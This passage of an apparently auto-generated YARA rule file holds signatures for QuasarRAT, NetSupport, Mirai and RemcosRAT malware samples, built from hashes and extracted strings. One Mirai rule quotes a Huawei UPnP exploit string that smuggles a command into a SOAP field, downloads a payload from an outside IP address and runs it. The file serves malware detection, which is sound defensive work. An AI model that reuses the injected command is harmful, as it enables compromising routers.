      hash9 = "8768859060387f56a2243b3d68d1b88fc12def261668c945d67ba7772f569b24"
      hash10 = "91638b5c9331d91c57a3b55363a7f5c76082d9261a8cfefc34fd3923dcf32dd5"
      hash11 = "9aa99c6f7cab60192507282874b120aa0401f64a2a56c23ef23aa781a90e7c5f"
      hash12 = "a6640f14b119df661bb6d99d1e16a07a5d0f609c5d4ea3375ef3fa74bcab8d14"
      hash13 = "b4cc18207df83ad7c5fee8b34d2f2e680ba7dc45e51002d62712034a4cef69c6"
      hash14 = "d017447f8ef2d707ce3a908e05bcac2206d8f5b8d63b72e494a81eb379b69853"
      hash15 = "db728098ee83742156ca473750c72cc14ea5d249cb61a1168009eacbd880c1b3"
   strings:
      $s1 = "get_PotentiallyVulnerablePasswords" fullword ascii /* score: '26.00'*/
      $s2 = "GetKeyloggerLogsDirectory" fullword ascii /* score: '22.00'*/
      $s3 = "GetKeyloggerLogsDirectoryResponse" fullword ascii /* score: '22.00'*/
      $s4 = "<PotentiallyVulnerablePasswords>k__BackingField" fullword ascii /* score: '21.00'*/
      $s5 = "set_PotentiallyVulnerablePasswords" fullword ascii /* score: '21.00'*/
      $s6 = "potentiallyVulnerablePasswords" fullword ascii /* score: '21.00'*/
      $s7 = "get_DismissedBreachAlertsByLoginGuid" fullword ascii /* score: '20.00'*/
      $s8 = "<Execute>b__3_1" fullword ascii /* score: '18.00'*/
      $s9 = "<Execute>b__3_0" fullword ascii /* score: '18.00'*/
      $s10 = "<EncryptedPassword>k__BackingField" fullword ascii /* score: '17.00'*/
      $s11 = "get_TimePasswordChanged" fullword ascii /* score: '17.00'*/
      $s12 = "Gma.System.MouseKeyHook" fullword ascii /* score: '17.00'*/
      $s13 = "get_PasswordField" fullword ascii /* score: '17.00'*/
      $s14 = "get_EncryptedUsername" fullword ascii /* score: '17.00'*/
      $s15 = "IMessageProcessor" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__12bc2271_QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_36 {
   meta:
      description = "_subset_batch - from files QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_12bc2271.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_dd24e53f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "12bc2271f1028192e643c23aea3eb3d802dd24d03ece51f62db4dd0c81e7aff2"
      hash2 = "dd24e53f878c083f08795e1482ee67c971b80b27264ea6d30adafeaaa9ae27df"
   strings:
      $x1 = "c:\\Users\\Nathu\\Desktop\\SerializerLib\\SerializerLib\\obj\\Debug\\SerializerLib.pdb" fullword ascii /* score: '33.00'*/
      $s2 = "SerializerLib.dll" fullword wide /* score: '23.00'*/
      $s3 = "\\SerializerLib.dll" fullword wide /* score: '21.00'*/
      $s4 = "_tempHeaderOffset" fullword ascii /* score: '16.00'*/
      $s5 = "_tempHeader" fullword ascii /* score: '16.00'*/
      $s6 = "m_TimeOfExecution" fullword ascii /* score: '16.00'*/
      $s7 = "InitMutex" fullword ascii /* score: '15.00'*/
      $s8 = "<GetReverseProxyByConnectionId>b__e" fullword ascii /* score: '15.00'*/
      $s9 = "RunningProcesses" fullword ascii /* score: '15.00'*/
      $s10 = "ReverseProxyCommandHandler" fullword ascii /* score: '15.00'*/
      $s11 = "GetHostsList" fullword ascii /* score: '14.00'*/
      $s12 = "GetRawHosts" fullword ascii /* score: '14.00'*/
      $s13 = "GetTotalRamAmount" fullword ascii /* score: '9.00'*/
      $s14 = "_appendHeader" fullword ascii /* score: '9.00'*/
      $s15 = "CloseShell" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 400KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _NetSupport_signature__NetSupport_signature__ce7748b3_37 {
   meta:
      description = "_subset_batch - from files NetSupport(signature).ps1, NetSupport(signature)_ce7748b3.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d7b46caebba2157fa58f06d9b6571939e4d51882dc8000c8c264a585b5eedf98"
      hash2 = "ce7748b3014f5349856cd5a588e5cdaabdfac83ca9639f425ac1fdbcd54a9703"
   strings:
      $s1 = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s2 = "iUHAvMTJ6NmY5ZHMrbi9YYlBwLzEyejZmOWRzK24vWGJQcC8xMno2ZjlkcytuL1hiUHAvMTJ6NmY5ZHMrbi9YYlBwLzEyejZmOWRzK24vWGJQcC8xMno2ZjhBQUFBQUF" ascii /* base64 encoded string */ /* score: '26.00'*/
      $s3 = "iUHAvMTJ6NmY5ZHMrbi9YYlBwLzEyejZmOWRzK24vWGJQcC8xMno2ZjlkcytuL1hiUHAvMTJ6NmY5ZHMrbi9YYlBwLzEyejZmOWRzK24vWGJQcC8xMno2ZjlkcytuL1h" ascii /* base64 encoded string  */ /* score: '26.00'*/
      $s4 = "b2VoQ0doQXp4WWxGL0ZOV2kvR0xCb3VRcEFBQUFGZi8wb1RBZFJScVRtanNueGtRYUxDYUdSRG9mZ1FCQUlQRURJTjlDQUIxQjhkRkNPZWJHUkNMUlFpTlVBR0tDRUNF" ascii /* base64 encoded string  */ /* score: '24.00'*/
      $s5 = "JQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWd" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s6 = "Ly8rTFJoaUxUZnhRVWVqTkZRQUFpUWVMRm91Q3BBQUFBSVBFQ0l2Ty85QmZoTUIxRjJpWEFBQUFhT3lmR1JCb3NKb1pFT2hUQXdFQWc4UU1pOFplaStWZHdnUUF6TXpN" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s7 = "ek16TXpGV0w3R3IvYUZDRkdSQmtvUUFBQUFCUWcrd1VWbGVoNkVJYUVEUEZVSTFGOUdTakFBQUFBSXZ4aTMwSWk4L29yU29BQUkxRjhGQ0x6dWd5MWYvL2kwM3doY2ww" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s8 = "ek16TXpGV0w3RjNweCtuLy84ek16TXpNek14VmkreGQ2YWZVLy8vTXpNek16TXpNVll2c1hlbFg2Ly8vek16TXpNek16RldMN0YzcHArdi8vOHpNek16TXpNeFZpK3hk" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s9 = "NlVmaC8vL016TXpNek16TVZZdnNYZWxYNGYvL3pNek16TXpNekZXTDdGM3BaK0gvLzh6TXpNek16TXhWaSt4ZDZhZlUvLy9Nek16TXpNek1WWXZzWGVubjFQLy96TXpN" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s10 = "eVhYNUs4SXp5WUYrR09uOUFBQVBsTUZBalh3SkFnK3YrSXZINklRYkFnQ0xSaGlMVlFpTDNGQlhVMUxva3hRQUFJUEVFRk9MenVnSTZQLy9pd2FMa0tRQUFBQ0x6di9T" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s11 = "c0o0WkVGYWpYSmthRVAvWGFKQ2VHUkJXbzBTWkdoRC8xMmg4bmhrUVZxTk1tUm9RLzlkb2FKNFpFRmFqVkprYUVQL1hhRkNlR1JCV28xaVpHaEQvMTEralFKa2FFTGdC" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s12 = "QUlQRURJdC9ERk5YalUwSTZHTWFBQUNMUlFoUWk4N0hSZndBQUFBQTZPSGwvLytMVFFoUjZDc1pBZ0NEeEFTTHhvdE45R1NKRFFBQUFBQlpYMTViaStWZHdnUUF6TXpN" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s13 = "VG90R0dGQlJqVTBJNkU0ZUFBQ0xUUWhSalUzZ3gwWDhBQUFBQU9oN013QUFqVlhnVW92UHhrWDhBZWg4UGdBQWpVM2d4a1g4QU9oQU5BQUFpMFVJVU1kRi9QLy8vLy9v" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s14 = "NkMvOC8vK0xUUWlOUlF4UVVlamkvdi8vZzhRSVhjUE16TXpNek16TXpNek16TXpNVll2c2d6MXNRQm9RQUhRRjZQLzcvLytMVFFpTlJReFFVZWpTL3YvL2c4UUlYY1BN" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s15 = "VjR2WmRRZkhSUWpubXhrUWkzVU1pOGJvZGhnQ0FJdjhWbW9BVitoTDhRRUFpME1ZaTAwSVVGWlhVZWg4RVFBQWc4UWNWbGVMeStnUTN2Ly9qV1h3WDE1YmkwMzhNODNv" ascii /* base64 encoded string  */ /* score: '21.00'*/
   condition:
      ( ( uint16(0) == 0x5624 or uint16(0) == 0xbbef ) and filesize < 27000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__e486a686_Mirai_signature__e5820391_Mirai_signature__e835b89a_Mirai_signature__edd124a6_Mirai_signature__f2_38 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_e486a686.elf, Mirai(signature)_e5820391.elf, Mirai(signature)_e835b89a.elf, Mirai(signature)_edd124a6.elf, Mirai(signature)_f21b61ed.elf, Mirai(signature)_f3f18039.elf, Mirai(signature)_fc1120ee.elf, Mirai(signature)_fc7e9911.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e486a6860fcb52ef37d48811497e8d711911ba30240fa83aa8e63f86980c6999"
      hash2 = "e5820391ace17fd7401509a07806c03cc40c3bdc05633bb5c671b6dc79738278"
      hash3 = "e835b89aa1f95af1187d308b10555035f7f6fb97b6782d0f611a957720647ea0"
      hash4 = "edd124a667c309a2173f91e2117ec674711f66156971e8ba0c405c1c7a659976"
      hash5 = "f21b61eda803995cf980b9a897e36d91aedb430f2b07258ee2efbb466105eb1f"
      hash6 = "f3f180395fc893db7dd1cee31126de9086e8d5167c654e0c1ae3c0b6706237ac"
      hash7 = "fc1120eef2173283dc316199b4c756cc39a7fd4748daed6e558b5d0c0fbc8c61"
      hash8 = "fc7e9911e20f78da70f0a289fd8b99839db208a817efcbbfae7b99fa9b605c39"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = "[DEBUG] Target %d ready: %s:%d" fullword ascii /* score: '26.50'*/
      $s3 = " -g 192.227.134.76 -l /tmp/.kx -r /resgod.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDownl" ascii /* score: '20.00'*/
      $s4 = "oadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s5 = "[DEBUG] Entering flood loop" fullword ascii /* score: '9.00'*/
      $s6 = "brvbqjl" fullword ascii /* score: '8.00'*/
      $s7 = "nlwlqlob" fullword ascii /* score: '8.00'*/
      $s8 = "pvsfqbgnjm" fullword ascii /* score: '8.00'*/
      $s9 = "gltmolbg" fullword ascii /* score: '8.00'*/
      $s10 = "bgnjmwfomfw" fullword ascii /* score: '8.00'*/
      $s11 = "pvsslqw" fullword ascii /* score: '8.00'*/
      $s12 = "eojqvpfq" fullword ascii /* score: '8.00'*/
      $s13 = "bgnjmjpwqbwlq" fullword ascii /* score: '8.00'*/
      $s14 = "gfebvow" fullword ascii /* score: '8.00'*/
      $s15 = "lsfqbwlq" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__074e6f0b_QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_39 {
   meta:
      description = "_subset_batch - from files QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_074e6f0b.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0ae8c502.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_12bc2271.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_21ea4b39.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5b14108c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_601331cb.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_650ca510.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_67504a7c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_91638b5c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a6640f14.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_db728098.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_dd24e53f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "074e6f0bbab42ec220ce7c74545986d8ba1a641eb1f8690ad0d90063b0529844"
      hash2 = "0ae8c5022567fc8588fdc2fbf27d1d245f7e9bb15a23cb8a01962be6b51cb73c"
      hash3 = "12bc2271f1028192e643c23aea3eb3d802dd24d03ece51f62db4dd0c81e7aff2"
      hash4 = "21ea4b39f79a9af056ffc368cc9e78abbddec1838885b00a4d7eaeeb306d8515"
      hash5 = "5b14108c4f7e043dd7e9a0f9a3793608bf5690ae37b4e624a06d10bfbc6e61c1"
      hash6 = "601331cb72752cbcc12488cbd5a679325dd2d76696e87f7c3195cba348f3d215"
      hash7 = "650ca51048cf80b76d0450b73b41a1e12b81d8c0f3288fe67204a0be985e1693"
      hash8 = "67504a7c1e834ec7a871393547f566e8e0d40b5a1bf1d63b6676345266dea1e9"
      hash9 = "91638b5c9331d91c57a3b55363a7f5c76082d9261a8cfefc34fd3923dcf32dd5"
      hash10 = "a6640f14b119df661bb6d99d1e16a07a5d0f609c5d4ea3375ef3fa74bcab8d14"
      hash11 = "db728098ee83742156ca473750c72cc14ea5d249cb61a1168009eacbd880c1b3"
      hash12 = "dd24e53f878c083f08795e1482ee67c971b80b27264ea6d30adafeaaa9ae27df"
   strings:
      $s1 = "GetPrimaryKey" fullword ascii /* score: '12.00'*/
      $s2 = "KeyEventArgsExt" fullword ascii /* score: '12.00'*/
      $s3 = "GetActiveKeyboard" fullword ascii /* score: '12.00'*/
      $s4 = "TryGetCharFromKeyboardState" fullword ascii /* score: '12.00'*/
      $s5 = "GetExclusiveOrPrimaryKey" fullword ascii /* score: '12.00'*/
      $s6 = "InvokeHotKeyHandler" fullword ascii /* score: '11.00'*/
      $s7 = "GetLowBit" fullword ascii /* score: '9.00'*/
      $s8 = "GetHighBit" fullword ascii /* score: '9.00'*/
      $s9 = "GetNativeState" fullword ascii /* score: '9.00'*/
      $s10 = "keepalivetime" fullword ascii /* score: '8.00'*/
      $s11 = "keepaliveinterval" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__e0e4fe62_Mirai_signature__e1c86a18_Mirai_signature__e25fd9a7_Mirai_signature__e2bd07c2_Mirai_signature__e4_40 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_e0e4fe62.elf, Mirai(signature)_e1c86a18.elf, Mirai(signature)_e25fd9a7.elf, Mirai(signature)_e2bd07c2.elf, Mirai(signature)_e4c0399e.elf, Mirai(signature)_e537e1d6.elf, Mirai(signature)_e86ac18f.elf, Mirai(signature)_ef22eb12.elf, Mirai(signature)_f2e0f63b.elf, Mirai(signature)_f422c102.elf, Mirai(signature)_f6c82004.elf, Mirai(signature)_f9ee512f.elf, Mirai(signature)_fcdd1016.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e0e4fe62b7d6de7c7f84cc9f6a7082f20c0eed2967b0370f6b814a802476d17f"
      hash2 = "e1c86a189cf8d89b0d096ac46899e691b68bc65942ff44ac14e9d75e1fbca802"
      hash3 = "e25fd9a72ffdf547cbbdda70d3419183efc01e94d91cfa9f3ad16b9c244931d1"
      hash4 = "e2bd07c2449ba0135da0e239310cb157d3fc2106610133eb365dc6602b96893b"
      hash5 = "e4c0399e873a8e5c2907ea700d8841121f4686abe6f95644ec01ec3ba28db4a5"
      hash6 = "e537e1d64cf006e0b1cd2fcf26f8ac277a1c7ed4c481df2428006d3ea2cd5b02"
      hash7 = "e86ac18f7e339a2ef607a3123c4db2e4a4a8259990ba27e14210a8b0834ddceb"
      hash8 = "ef22eb1202da76a34463883d389b4ba38fec546f63448baa5ce23f14df37e3fb"
      hash9 = "f2e0f63b0440da9e40485d2fe5e18509d059eb3c8e7b54ee1267a58619745c46"
      hash10 = "f422c102cdfb10f6d5e2eca65b8fec443d4f08340f116780ce34c746957217b2"
      hash11 = "f6c8200485d56e28cbc23a27c667a4ed7a5baf88e5edcef7d4326eedc348473b"
      hash12 = "f9ee512f27d1b9894fbae47aadaa86912c24b8926cb71b51197483946bcd4a3f"
      hash13 = "fcdd10162bcdf72f022da7e1883227f26eedead93d9f3e028d01cae38a00e2a3"
   strings:
      $s1 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0" fullword ascii /* score: '14.00'*/
      $s2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s3 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0." ascii /* score: '14.00'*/
      $s4 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0" fullword ascii /* score: '14.00'*/
      $s5 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s6 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0" fullword ascii /* score: '14.00'*/
      $s7 = "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s8 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0" fullword ascii /* score: '14.00'*/
      $s9 = "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s10 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s11 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s12 = "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s13 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0" fullword ascii /* score: '14.00'*/
      $s14 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s15 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/121.0.0.0" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__e2bd07c2_Mirai_signature__e537e1d6_Mirai_signature__e86ac18f_Mirai_signature__ef22eb12_Mirai_signature__f9_41 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_e2bd07c2.elf, Mirai(signature)_e537e1d6.elf, Mirai(signature)_e86ac18f.elf, Mirai(signature)_ef22eb12.elf, Mirai(signature)_f9ee512f.elf, Mirai(signature)_fcdd1016.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e2bd07c2449ba0135da0e239310cb157d3fc2106610133eb365dc6602b96893b"
      hash2 = "e537e1d64cf006e0b1cd2fcf26f8ac277a1c7ed4c481df2428006d3ea2cd5b02"
      hash3 = "e86ac18f7e339a2ef607a3123c4db2e4a4a8259990ba27e14210a8b0834ddceb"
      hash4 = "ef22eb1202da76a34463883d389b4ba38fec546f63448baa5ce23f14df37e3fb"
      hash5 = "f9ee512f27d1b9894fbae47aadaa86912c24b8926cb71b51197483946bcd4a3f"
      hash6 = "fcdd10162bcdf72f022da7e1883227f26eedead93d9f3e028d01cae38a00e2a3"
   strings:
      $s1 = "GET /?%s%d HTTP/1.1" fullword ascii /* score: '19.00'*/
      $s2 = "test@example.com" fullword ascii /* score: '18.00'*/
      $s3 = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" fullword ascii /* score: '17.00'*/
      $s4 = "/downloads/brochure.pdf" fullword ascii /* score: '13.00'*/
      $s5 = "/login" fullword ascii /* score: '12.00'*/
      $s6 = "/assets/images/logo.png" fullword ascii /* score: '12.00'*/
      $s7 = "/wp-content/uploads/2023/" fullword ascii /* score: '11.00'*/
      $s8 = "Product description text" fullword ascii /* score: '10.00'*/
      $s9 = "Warning: Failed to load proxies, continuing with direct connections" fullword ascii /* score: '10.00'*/
      $s10 = "200 Connection established" fullword ascii /* score: '9.00'*/
      $s11 = "\"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0\"" fullword ascii /* score: '9.00'*/
      $s12 = "/api/v1/users" fullword ascii /* score: '9.00'*/
      $s13 = "\"Opera\";v=\"107\", \"Chromium\";v=\"121\", \"Not?A_Brand\";v=\"24\"" fullword ascii /* score: '9.00'*/
      $s14 = "This is a test message with some content" fullword ascii /* score: '9.00'*/
      $s15 = "%s%s=%s%s" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__045d2444_RemcosRAT_signature__4e2701f9_42 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_045d2444.vbs, RemcosRAT(signature)_4e2701f9.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "045d2444fe26511003ddfb15e92697fb6f0278754817448d12525d65e75f1fdc"
      hash2 = "4e2701f98ef8250ab1f2f9eef59f51fef7807e9c2cf226b7063be48a4b296b27"
   strings:
      $s1 = "' Internal method - Process a completely parsed event" fullword ascii /* score: '26.00'*/
      $s2 = "' Log any SMTP errors" fullword ascii /* score: '17.00'*/
      $s3 = "' SMTP 'To' email address. Multiple addresses are separated by commas" fullword ascii /* score: '15.00'*/
      $s4 = "End Sub ' ProcessEvent" fullword ascii /* score: '15.00'*/
      $s5 = "rshell -N" fullword ascii /* score: '13.00'*/
      $s6 = "' Optional password (may be required for SMTP authentication)" fullword ascii /* score: '13.00'*/
      $s7 = "' Log any network errors" fullword ascii /* score: '12.00'*/
      $s8 = "End Sub ' SSMON_ParseCommandLine" fullword ascii /* score: '12.00'*/
      $s9 = "End Sub ' SSMON_LogError" fullword ascii /* score: '12.00'*/
      $s10 = "' strUser has User + Date + Time, and should still be parsed" fullword ascii /* score: '11.00'*/
      $s11 = "' Name of SMTP server" fullword ascii /* score: '9.00'*/
      $s12 = "' Comment text" fullword ascii /* score: '9.00'*/
      $s13 = "End Sub ' ConnectToShare" fullword ascii /* score: '9.00'*/
      $s14 = "' SMTP email subject" fullword ascii /* score: '9.00'*/
      $s15 = "' Log progress" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x0a0d and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _N_W_rm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash___43 {
   meta:
      description = "_subset_batch - from files N-W-rm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_074e6f0b.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0ae8c502.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_12bc2271.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_21ea4b39.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2f3c0ed2.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5b14108c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_601331cb.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_650ca510.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_67504a7c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_91638b5c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a6640f14.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d42ac4e3.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_db728098.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_dd24e53f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2b9797f8cc8259275cbb727b5ec10068ea868838cd803381b7089ba97c8b1b7b"
      hash2 = "074e6f0bbab42ec220ce7c74545986d8ba1a641eb1f8690ad0d90063b0529844"
      hash3 = "0ae8c5022567fc8588fdc2fbf27d1d245f7e9bb15a23cb8a01962be6b51cb73c"
      hash4 = "12bc2271f1028192e643c23aea3eb3d802dd24d03ece51f62db4dd0c81e7aff2"
      hash5 = "21ea4b39f79a9af056ffc368cc9e78abbddec1838885b00a4d7eaeeb306d8515"
      hash6 = "2f3c0ed245f51ba046dc425e32409890f029a235cf0cc4330c5088bc1465053d"
      hash7 = "5b14108c4f7e043dd7e9a0f9a3793608bf5690ae37b4e624a06d10bfbc6e61c1"
      hash8 = "601331cb72752cbcc12488cbd5a679325dd2d76696e87f7c3195cba348f3d215"
      hash9 = "650ca51048cf80b76d0450b73b41a1e12b81d8c0f3288fe67204a0be985e1693"
      hash10 = "67504a7c1e834ec7a871393547f566e8e0d40b5a1bf1d63b6676345266dea1e9"
      hash11 = "91638b5c9331d91c57a3b55363a7f5c76082d9261a8cfefc34fd3923dcf32dd5"
      hash12 = "a6640f14b119df661bb6d99d1e16a07a5d0f609c5d4ea3375ef3fa74bcab8d14"
      hash13 = "d42ac4e3da7e1aa7ae41d0547c0cdcf1e30300fb2ea96cea42bb1d43a5000b27"
      hash14 = "db728098ee83742156ca473750c72cc14ea5d249cb61a1168009eacbd880c1b3"
      hash15 = "dd24e53f878c083f08795e1482ee67c971b80b27264ea6d30adafeaaa9ae27df"
   strings:
      $s1 = "ProcessDown" fullword ascii /* score: '15.00'*/
      $s2 = "ProcessMove" fullword ascii /* score: '15.00'*/
      $s3 = "ProcessWheel" fullword ascii /* score: '15.00'*/
      $s4 = "ProcessUp" fullword ascii /* score: '15.00'*/
      $s5 = "get_SystemInfos" fullword ascii /* score: '12.00'*/
      $s6 = "GetKeyListener" fullword ascii /* score: '12.00'*/
      $s7 = "get_IsKeyDown" fullword ascii /* score: '12.00'*/
      $s8 = "GetMouseListener" fullword ascii /* score: '12.00'*/
      $s9 = "get_IsKeyUp" fullword ascii /* score: '12.00'*/
      $s10 = "InvokeKeyPress" fullword ascii /* score: '11.00'*/
      $s11 = "InvokeKeyUp" fullword ascii /* score: '11.00'*/
      $s12 = "InvokeKeyDown" fullword ascii /* score: '11.00'*/
      $s13 = "SELECT * FROM Win32_DisplayConfiguration" fullword wide /* score: '11.00'*/
      $s14 = "GetPressEventArgs" fullword ascii /* score: '9.00'*/
